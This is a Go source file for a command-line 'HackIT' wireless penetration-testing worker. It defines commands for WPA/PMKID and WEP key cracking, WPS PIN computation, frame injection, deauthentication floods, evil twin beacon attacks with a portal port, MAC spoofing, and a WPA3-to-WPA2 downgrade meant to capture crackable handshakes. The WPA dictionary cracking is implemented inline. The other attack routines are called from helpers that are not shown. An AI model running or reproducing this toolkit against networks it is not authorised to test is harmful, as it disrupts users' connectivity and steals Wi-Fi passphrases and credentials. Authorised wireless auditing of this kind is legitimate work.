package main

import (
	"bufio"
	"encoding/hex"
	"fmt"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/spf13/cobra"
)

var packetBufPool = sync.Pool{
	New: func() any {
		b := make([]byte, 2048)
		return &b
	},
}

var rootCmd = &cobra.Command{
	Use:   "hackit-worker",
	Short: "HackIT Wireless Distributed Worker Node",
	Long:  "Wireless penetration testing worker: WPA cracking, channel hopping, AP auditing, interface control",
}

var crackCmd = &cobra.Command{
	Use:   "crack [hashfile] [wordlist]",
	Short: "Crack WPA/WPA2 handshake with dictionary attack",
	Long:  "Crack PMKID (WPA*01) or 4-way handshake (WPA*02) in hashcat 22000 format",
	Args:  cobra.ExactArgs(2),
	Run: func(cmd *cobra.Command, args []string) {
		hashfile, wordlist := args[0], args[1]
		fmt.Println("[+] HackIT WPA Cracker v3.0")
		fmt.Printf("[*] Hash file: %s\n", hashfile)
		fmt.Printf("[*] Wordlist:  %s\n", wordlist)

		hashes, err := loadHashLines(hashfile)
		if err != nil {
			fmt.Printf("[-] %v\n", err)
			return
		}
		words, err := loadWordlist(wordlist)
		if err != nil {
			fmt.Printf("[-] %v\n", err)
			return
		}
		fmt.Printf("[*] %d hash(es), %d candidate(s)\n\n", len(hashes), len(words))

		anyFound := false
		for _, line := range hashes {
			h, perr := ParseHash22000(line)
			if perr != nil {
				fmt.Printf("[-] skip: %v\n", perr)
				continue
			}
			ssid := h.SSID
			fmt.Printf("[*] target SSID=%s BSSID=%s kind=%s pair=%s\n",
				ssid, formatMAC(h.APMAC), h.Kind, h.MsgPair)
			start := time.Now()

			var password string
			var tested int64
			switch h.Kind {
			case "01":
				password, tested = crackPMKIDWordlist(h, words)
			case "02":
				mode, _ := cmd.Flags().GetBool("pmkid-only")
				if mode {
					continue
				}
				password, tested = Crack4Way(h, words, func(t, total int64, _ string) bool {
					elapsed := time.Since(start).Seconds()
					rate := float64(t) / elapsed
					fmt.Printf("\r[+] tested %d/%d | %.0f p/s", t, total, rate)
					return false
				})
			default:
				fmt.Printf("[-] unsupported kind %s\n", h.Kind)
				continue
			}
			fmt.Println()
			elapsed := time.Since(start).Round(time.Millisecond)
			if password != "" {
				anyFound = true
				printResult(true, password, h.APMAC, ssid, elapsed.String(), tested)
			} else {
				printResult(false, "", h.APMAC, ssid, elapsed.String(), tested)
			}
		}
		if anyFound {
			fmt.Println("\n[+] Done — passphrase recovered")
		} else {
			fmt.Println("\n[-] Done — no passphrase matched the wordlist")
		}
	},
}

// loadHashLines reads every non-comment line from a hash file.
func loadHashLines(path string) ([]string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, fmt.Errorf("cannot open hash file: %w", err)
	}
	defer f.Close()
	var out []string
	sc := bufio.NewScanner(f)
	sc.Buffer(make([]byte, 1024*1024), 1024*1024)
	for sc.Scan() {
		line := strings.TrimSpace(sc.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			out = append(out, line)
		}
	}
	return out, sc.Err()
}

// loadWordlist streams the whole wordlist into memory for repeated passes.
func loadWordlist(path string) ([]string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, fmt.Errorf("cannot open wordlist: %w", err)
	}
	defer f.Close()
	var out []string
	sc := bufio.NewScanner(f)
	sc.Buffer(make([]byte, 1024*1024), 1024*1024)
	for sc.Scan() {
		w := strings.TrimSpace(sc.Text())
		if w != "" {
			out = append(out, w)
		}
	}
	return out, sc.Err()
}

// crackPMKIDWordlist brute-forces the PMKID side of a WPA*01 record.
func crackPMKIDWordlist(h *Hash22000, words []string) (string, int64) {
	var tested int64
	start := time.Now()
	for _, password := range words {
		tested++
		pmk := DerivePMK(password, h.SSID)
		pmkid := ComputePMKID(pmk, h.APMAC, h.STAMAC)
		if hmacEqual(pmkid, h.MIC) {
			return password, tested
		}
		if tested%20000 == 0 {
			elapsed := time.Since(start).Seconds()
			rate := float64(tested) / elapsed
			fmt.Printf("\r[+] tested %d | %.0f p/s", tested, rate)
		}
	}
	return "", tested
}

func formatMAC(mac []byte) string {
	return fmt.Sprintf("%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5])
}

func printResult(found bool, password string, apMac []byte, ssid string, elapsed string, tested int64) {
	if found {
		fmt.Printf("[+] KEY FOUND  SSID=%s  BSSID=%s\n", ssid, formatMAC(apMac))
		fmt.Printf("[+] PASSPHRASE: %s\n", password)
	} else {
		fmt.Printf("[-] no match   SSID=%s  BSSID=%s  (%d tested)\n", ssid, formatMAC(apMac), tested)
	}
	fmt.Printf("[*] elapsed %s\n", elapsed)
}

// PrintCrackResult keeps the historical export used by other workers.
func PrintCrackResult(found bool, password string, apMac []byte, ssid string, elapsed string) {
	printResult(found, password, apMac, ssid, elapsed, 0)
}

func hexStringToBytes(s string) ([]byte, error) {
	return hex.DecodeString(strings.ReplaceAll(s, ":", ""))
}

func hmacEqual(a, b []byte) bool {
	if len(a) != len(b) {
		return false
	}
	var diff byte
	for i := range a {
		diff |= a[i] ^ b[i]
	}
	return diff == 0
}

var modeCmd = &cobra.Command{
	Use:   "mode [interface] [monitor|managed]",
	Short: "Transition adapter mode",
	Args:  cobra.ExactArgs(2),
	Run: func(cmd *cobra.Command, args []string) {
		iface := args[0]
		mode := args[1]
		helper := &ModeHelper{}
		err := helper.TransitionMode(iface, mode)
		if err != nil {
			fmt.Printf("[GO-ERROR] Failed transitioning interface %s: %v\n", iface, err)
			os.Exit(1)
		}
		fmt.Printf("[GO-SUCCESS] Interface %s successfully transitioned to %s.\n", iface, mode)
	},
}

var auditCmd = &cobra.Command{
	Use:   "audit [ssid] [bssid]",
	Short: "Audit AP against whitelist",
	Args:  cobra.ExactArgs(2),
	Run: func(cmd *cobra.Command, args []string) {
		ssid := args[0]
		bssid := args[1]
		auditor := &APAuditor{}
		_ = auditor.LoadWhitelist("whitelist.json")
		result := auditor.AuditAP(ssid, bssid)
		fmt.Printf("[GO-AUDIT-RESULT] AP '%s' [%s] -> %s\n", ssid, bssid, result)
	},
}

var adapterInfoCmd = &cobra.Command{
	Use:   "adapter-info [interface]",
	Short: "Display interface chipset info",
	Args:  cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		mgr := &InterfaceControlManager{}
		mgr.PrintAdapterInfo(args[0])
	},
}

var macCmd = &cobra.Command{
	Use:   "mac [interface] [random|restore|new_mac]",
	Short: "Spoof or restore MAC address",
	Args:  cobra.ExactArgs(2),
	Run: func(cmd *cobra.Command, args []string) {
		mgr := &InterfaceControlManager{}
		err := mgr.TransitionMAC(args[0], args[1])
		if err != nil {
			fmt.Printf("[-] Failed: %v\n", err)
			os.Exit(1)
		}
		fmt.Println("[+] MAC configuration updated successfully.")
	},
}

var txpowerCmd = &cobra.Command{
	Use:   "txpower [interface] [value]",
	Short: "Set TX power limit",
	Args:  cobra.ExactArgs(2),
	Run: func(cmd *cobra.Command, args []string) {
		mgr := &InterfaceControlManager{}
		var val int
		fmt.Sscanf(args[1], "%d", &val)
		err := mgr.TransitionTxPower(args[0], val)
		if err != nil {
			fmt.Printf("[-] Failed: %v\n", err)
			os.Exit(1)
		}
		fmt.Println("[+] TxPower updated.")
	},
}

var channelCmd = &cobra.Command{
	Use:   "channel [interface] [channel]",
	Short: "Lock adapter to specific channel",
	Args:  cobra.ExactArgs(2),
	Run: func(cmd *cobra.Command, args []string) {
		mgr := &InterfaceControlManager{}
		var ch int
		fmt.Sscanf(args[1], "%d", &ch)
		err := mgr.TransitionChannel(args[0], ch)
		if err != nil {
			fmt.Printf("[-] Failed: %v\n", err)
			os.Exit(1)
		}
		fmt.Println("[+] Channel locked.")
	},
}

var statusCmd = &cobra.Command{
	Use:   "status [interface]",
	Short: "Display interface status",
	Args:  cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		mgr := &InterfaceControlManager{}
		mgr.PrintStatus(args[0])
	},
}

var dualBandCmd = &cobra.Command{
	Use:   "dual-band [interface]",
	Short: "Scan both 2.4GHz and 5GHz channels",
	Args:  cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		iface := args[0]
		fmt.Printf("[GO-DUAL] Scanning dual-band on %s...\n", iface)
		channels := ScanDualBand(iface)
		fmt.Printf("[GO-DUAL] Found %d channels:\n", len(channels))
		for _, ch := range channels {
			fmt.Printf("  Ch %3d | %d MHz | %s | RSSI: %d dBm | APs: %d | Util: %.1f%%\n",
				ch.Number, ch.Frequency, ch.Band, ch.RSSI, ch.APCount, ch.Utilization*100)
		}
		best := FindBestChannel(channels)
		fmt.Printf("[GO-DUAL] Best channel: %d (%d MHz) - %s\n", best.Number, best.Frequency, best.Band)
	},
}

var hashcatCmd = &cobra.Command{
	Use:   "hashcat-convert [pcap_file] [output_file]",
	Short: "Convert PCAP to hashcat HC22000 format",
	Args:  cobra.ExactArgs(2),
	Run: func(cmd *cobra.Command, args []string) {
		pcapFile := args[0]
		outputFile := args[1]
		fmt.Printf("[GO-HASHCAT] Converting %s to HC22000 format -> %s\n", pcapFile, outputFile)
		entries, err := ParseHC22000File(pcapFile)
		if err != nil {
			fmt.Printf("[-] Error parsing: %v\n", err)
			return
		}
		fmt.Printf("[GO-HASHCAT] Found %d valid hash entries\n", len(entries))
		for _, e := range entries {
			fmt.Printf("[GO-HASHCAT] SSID: %s | PMKID: %s | AP: %02X:%02X:%02X:%02X:%02X:%02X\n",
				e.ESSID, e.PMKID[:16]+"...", e.APMac[0], e.APMac[1], e.APMac[2],
				e.APMac[3], e.APMac[4], e.APMac[5])
		}
	},
}

var spectrumCmd = &cobra.Command{
	Use:   "spectrum [interface]",
	Short: "Analyze spectrum and find best channel",
	Args:  cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		iface := args[0]
		fmt.Printf("[GO-SPECTRUM] Analyzing spectrum on %s...\n", iface)
		channels := ScanDualBand(iface)
		fmt.Println("\n=== 2.4GHz Band ===")
		for _, ch := range channels {
			if ch.Band == "2.4GHz" {
				fmt.Printf("  Ch %2d | %d MHz | RSSI: %3d dBm | APs: %d | Util: %5.1f%%\n",
					ch.Number, ch.Frequency, ch.RSSI, ch.APCount, ch.Utilization*100)
			}
		}
		fmt.Println("\n=== 5GHz Band ===")
		for _, ch := range channels {
			if ch.Band == "5GHz" {
				fmt.Printf("  Ch %3d | %d MHz | RSSI: %3d dBm | APs: %d | Util: %5.1f%%\n",
					ch.Number, ch.Frequency, ch.RSSI, ch.APCount, ch.Utilization*100)
			}
		}
		best := FindBestChannel(channels)
		fmt.Printf("\n[GO-SPECTRUM] Recommended channel: %d (%d MHz) - %s\n", best.Number, best.Frequency, best.Band)
	},
}

var wpsCmd = &cobra.Command{
	Use:   "wps-pin [bssid]",
	Short: "Compute WPS PIN from BSSID",
	Args:  cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		pin, err := ComputeWpsPin(args[0])
		if err != nil {
			fmt.Printf("[-] WPS PIN error: %v\n", err)
			return
		}
		fmt.Printf("[GO-WPS] BSSID: %s\n", args[0])
		fmt.Printf("[GO-WPS] Default PIN: %s\n", pin)
		fmt.Printf("[GO-WPS] Valid: %v\n", ValidateWpsPin(pin))
		candidates := GenerateWpsCandidates(args[0])
		fmt.Printf("[GO-WPS] %d candidate PINs generated\n", len(candidates))
	},
}

var wepCrackCmd = &cobra.Command{
	Use:   "wep-crack [pcap_file]",
	Short: "Crack WEP key from captured IVs",
	Args:  cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		cracker := NewWepCracker()
		if err := cracker.LoadPcap(args[0]); err != nil {
			fmt.Printf("[-] Load error: %v\n", err)
			return
		}
		fmt.Printf("[GO-WEP] Loaded %d IVs from %s\n", cracker.IvCount(), args[0])
		if !cracker.IsReady() {
			fmt.Printf("[GO-WEP] Need more IVs (have %d, need 5000+)\n", cracker.IvCount())
			return
		}
		if key, err := cracker.PtwAttack(); err == nil {
			fmt.Printf("[GO-WEP] PTW attack succeeded: %s\n", key)
		} else {
			fmt.Printf("[GO-WEP] PTW attack failed: %v\n", err)
		}
	},
}

var packetGenCmd = &cobra.Command{
	Use:   "packet-gen [iface] [type] [ssid]",
	Short: "Generate and inject 802.11 management frames",
	Args:  cobra.RangeArgs(2, 3),
	Run: func(cmd *cobra.Command, args []string) {
		iface := args[0]
		frameType := args[1]
		ssid := fmt.Sprintf("AP_%d", time.Now().UnixMilli()%10000)
		if len(args) > 2 {
			ssid = args[2]
		}
		bssid := make([]byte, 6)
		t := time.Now().UnixNano()
		for i := range bssid {
			bssid[i] = byte(t >> (i * 8))
		}
		bssid[0] = 0x02
		sta := []byte{0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}
		var frame []byte
		switch frameType {
		case "auth":
			frame = BuildAuthFrame(bssid, sta, 0, 1, 0)
			fmt.Printf("[GO-PKT] Auth frame (%d bytes)\n", len(frame))
		case "assoc":
			frame = BuildAssocReq(bssid, sta, ssid)
			fmt.Printf("[GO-PKT] Assoc request (%d bytes)\n", len(frame))
		case "probe":
			frame = BuildProbeResp(bssid, sta, ssid, 6)
			fmt.Printf("[GO-PKT] Probe response (%d bytes)\n", len(frame))
		case "null":
			frame = BuildNullData(bssid, sta, false)
			fmt.Printf("[GO-PKT] Null data frame (%d bytes)\n", len(frame))
		default:
			fmt.Printf("[-] Unknown frame type: %s (auth, assoc, probe, null)\n", frameType)
			return
		}
		if err := SendFrame(iface, frame); err != nil {
			fmt.Printf("[-] Send error: %v\n", err)
		}
	},
}

var sessionCmd = &cobra.Command{
	Use:   "session",
	Short: "Manage capture sessions",
	Run: func(cmd *cobra.Command, args []string) {
		sm := NewSessionManager("sessions.json")
		_ = sm.Load()
		sessions := sm.ListSessions()
		if len(sessions) == 0 {
			fmt.Println("[GO-SESSION] No sessions found")
			return
		}
		for _, s := range sessions {
			fmt.Printf("[GO-SESSION] %s | %s | %s | %s | %s\n",
				s.ID[:8], s.SSID, s.BSSID, s.HashType, s.Status)
		}
	},
}

var sessionCreateCmd = &cobra.Command{
	Use:   "session-create [bssid] [ssid] [channel] [file] [type]",
	Short: "Create a new capture session",
	Args:  cobra.ExactArgs(5),
	Run: func(cmd *cobra.Command, args []string) {
		sm := NewSessionManager("sessions.json")
		_ = sm.Load()
		ch := 0
		fmt.Sscanf(args[2], "%d", &ch)
		s := sm.CreateSession(args[0], args[1], ch, args[3], args[4])
		_ = sm.Save()
		fmt.Printf("[GO-SESSION] Created: %s\n", s.ID)
	},
}

var vendorCmd = &cobra.Command{
	Use:   "vendor <mac>",
	Short: "Look up vendor by MAC address OUI",
	Long:  "Resolve the manufacturer/vendor name from the first 3 octets (OUI) of a MAC address",
	Args:  cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		mac := args[0]
		vendor := GlobalOUI.LookupVendor(mac)
		fmt.Printf("%s  %s\n", mac, vendor)
	},
}

var eviltwinCmd = &cobra.Command{
	Use:   "eviltwin",
	Short: "Evil twin beacon flood attack (v1/v2/v3)",
}

var eviltwinV1Cmd = &cobra.Command{
	Use:   "v1 <iface> <ssid> <bssid> <channel>",
	Short: "Broadcast a single evil twin beacon (V1)",
	Args:  cobra.ExactArgs(4),
	Run: func(cmd *cobra.Command, args []string) {
		iface := args[0]
		ssid := args[1]
		bssid := args[2]
		channel, _ := strconv.Atoi(args[3])

		stop := make(chan struct{})
		sigCh := make(chan os.Signal, 1)
		signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
		go func() {
			<-sigCh
			close(stop)
		}()

		if err := EviltwinV1(iface, ssid, bssid, channel, stop); err != nil {
			fmt.Fprintf(os.Stderr, "[-] EviltwinV1 error: %v\n", err)
			os.Exit(1)
		}
	},
}

var eviltwinV2Cmd = &cobra.Command{
	Use:   "v2 <iface> <ssids> <bssids> <channel>",
	Short: "Broadcast multiple SSIDs/BSSIDs round-robin (V2)",
	Args:  cobra.ExactArgs(4),
	Run: func(cmd *cobra.Command, args []string) {
		iface := args[0]
		ssids := strings.Split(args[1], ",")
		bssids := strings.Split(args[2], ",")
		channel, _ := strconv.Atoi(args[3])

		stop := make(chan struct{})
		sigCh := make(chan os.Signal, 1)
		signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
		go func() {
			<-sigCh
			close(stop)
		}()

		if err := EviltwinV2(iface, ssids, bssids, channel, stop); err != nil {
			fmt.Fprintf(os.Stderr, "[-] EviltwinV2 error: %v\n", err)
			os.Exit(1)
		}
	},
}

var eviltwinV3Cmd = &cobra.Command{
	Use:   "v3 <iface> <ssid> <bssid> <channel> <portalPort>",
	Short: "Broadcast evil twin beacon with JSON stats (V3)",
	Args:  cobra.ExactArgs(5),
	Run: func(cmd *cobra.Command, args []string) {
		iface := args[0]
		ssid := args[1]
		bssid := args[2]
		channel, _ := strconv.Atoi(args[3])
		portalPort, _ := strconv.Atoi(args[4])

		stop := make(chan struct{})
		sigCh := make(chan os.Signal, 1)
		signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
		go func() {
			<-sigCh
			close(stop)
		}()

		if err := EviltwinV3(iface, ssid, bssid, channel, portalPort, stop); err != nil {
			fmt.Fprintf(os.Stderr, "[-] EviltwinV3 error: %v\n", err)
			os.Exit(1)
		}
	},
}

func init() {
	crackCmd.Flags().Bool("pmkid-only", false, "skip 4-way (WPA*02) records")
	deauthCmd.Flags().IntP("count", "n", 0, "Number of frames (0 = run until Ctrl+C)")
	deauthCmd.Flags().Uint16P("reason", "r", 0, "Reason code (0 = rotate)")
	deauthCmd.Flags().Bool("hop", false, "Hop channels across 2.4 and 5 GHz")
	deauthCmd.Flags().Int("hop-delay", 100, "ms per channel when hopping")
	rootCmd.AddCommand(deauthCmd)
	rootCmd.AddCommand(crackCmd)
	rootCmd.AddCommand(modeCmd)
	rootCmd.AddCommand(auditCmd)
	rootCmd.AddCommand(adapterInfoCmd)
	rootCmd.AddCommand(macCmd)
	rootCmd.AddCommand(txpowerCmd)
	rootCmd.AddCommand(channelCmd)
	rootCmd.AddCommand(statusCmd)
	rootCmd.AddCommand(dualBandCmd)
	rootCmd.AddCommand(hashcatCmd)
	rootCmd.AddCommand(spectrumCmd)
	rootCmd.AddCommand(wpsCmd)
	rootCmd.AddCommand(wepCrackCmd)
	rootCmd.AddCommand(packetGenCmd)
	rootCmd.AddCommand(sessionCmd)
	rootCmd.AddCommand(sessionCreateCmd)
	rootCmd.AddCommand(vendorCmd)
	rootCmd.AddCommand(eviltwinCmd)
	eviltwinCmd.AddCommand(eviltwinV1Cmd)
	eviltwinCmd.AddCommand(eviltwinV2Cmd)
	eviltwinCmd.AddCommand(eviltwinV3Cmd)
	rootCmd.AddCommand(wpa3DowngradeCmd)
}

var deauthCmd = &cobra.Command{
	Use:   "deauth <iface> <bssid> [station]",
	Short: "Real 802.11 deauthentication flood (dual-band, reason rotation)",
	Long:  "Fires raw deauth frames over AF_PACKET. --count 0 runs until Ctrl+C; --hop rotates 2.4+5GHz; --reason 0 rotates reason codes.",
	Args:  cobra.RangeArgs(2, 3),
	Run: func(cmd *cobra.Command, args []string) {
		iface := args[0]
		bssid := args[1]
		station := ""
		if len(args) >= 3 {
			station = args[2]
		}
		count, _ := cmd.Flags().GetInt("count")
		reason16, _ := cmd.Flags().GetUint16("reason")
		hop, _ := cmd.Flags().GetBool("hop")
		hopDelay, _ := cmd.Flags().GetInt("hop-delay")
		err := runDeauthEngine(deauthEngineOpts{
			Iface: iface, BSSID: bssid, Station: station,
			Count: count, Reason: reason16, Hop: hop, HopDelay: hopDelay,
		})
		if err != nil {
			fmt.Printf("[-] deauth failed: %v\n", err)
			os.Exit(1)
		}
	},
}

func init() {
	wpa3DowngradeCmd.Flags().Int("channel", 6, "802.11 channel for spoofed beacons")
	wpa3DowngradeCmd.Flags().Int("duration", 0, "seconds to run (0 = until Ctrl+C)")
}

var wpa3DowngradeCmd = &cobra.Command{
	Use:   "wpa3-downgrade <iface> <bssid> <ssid>",
	Short: "Poison RSN IE to force WPA3→WPA2 transition for handshake capture",
	Long:  "Spoofs beacon RSN IE advertising WPA2-PSK/CCMP instead of WPA3-SAE. " +
		"Run alongside a deauth loop; clients that support both downgrade and emit " +
		"crackable WPA2 4-way handshakes.",
	Args: cobra.ExactArgs(3),
	Run: func(cmd *cobra.Command, args []string) {
		iface, bssid, ssid := args[0], args[1], args[2]
		ch, _ := cmd.Flags().GetInt("channel")
		duration, _ := cmd.Flags().GetInt("duration")
		worker := NewWPA3Downgrade(iface, bssid, ssid, ch)
		if err := worker.Run(); err != nil {
			fmt.Printf("[-] downgrade failed: %v\n", err)
			os.Exit(1)
		}
		fmt.Printf("[+] WPA3 downgrade running on ch%d — sent=%d frames so far\n", ch, worker.Sent())
		sig := make(chan os.Signal, 1)
		signal.Notify(sig, os.Interrupt, syscall.SIGTERM)
		if duration > 0 {
			select {
			case <-sig:
			case <-time.After(time.Duration(duration) * time.Second):
			}
		} else {
			<-sig
		}
		worker.Stop_()
		fmt.Printf("[+] stopped — total beacons sent: %d bytes\n", worker.Sent())
	},
}

func main() {
	if err := rootCmd.Execute(); err != nil {
		fmt.Println(strings.Repeat("-", 40))
		fmt.Println(err)
		os.Exit(1)
	}
}
